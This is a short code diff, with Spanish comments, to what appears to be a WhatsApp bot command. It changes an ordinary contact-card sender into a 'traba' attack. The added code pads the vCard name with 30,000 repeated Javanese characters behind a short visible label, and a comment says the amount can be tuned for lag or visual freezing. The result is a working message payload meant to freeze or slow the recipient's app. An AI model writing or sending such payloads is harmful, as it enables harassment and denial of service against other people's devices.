@@ -1,19 +1,20 @@
-let handler = async (m, { conn, text, usedPrefix, command }) => {
-  // Número del contacto (sin @ ni espacios)
-  const number = '521234567890'; 
-  const name = 'Tobi El Zorro 🦊'; // Nombre del contacto
+let handler = async (m, { conn }) => {
+  const number = '521234567890'; // Número real del contacto
+  const basura = 'ꦾ'.repeat(30000); // Puedes ajustar esto según tu objetivo (lag, traba visual, etc.)
+  const visible = '🧠 CONTACTO 🧠'; // Nombre corto visible
+  const nombreFinal = visible + basura;
 
   const vcard = `
 BEGIN:VCARD
 VERSION:3.0
-FN:${name}
+FN:${nombreFinal}
 TEL;type=CELL;type=VOICE;waid=${number}:${number}
 END:VCARD
   `.trim();
 
   await conn.sendMessage(m.chat, {
     contacts: {
-      displayName: name,
+      displayName: visible, // Mostrar algo legible
       contacts: [{ vcard }]
     }
   }, { quoted: m });
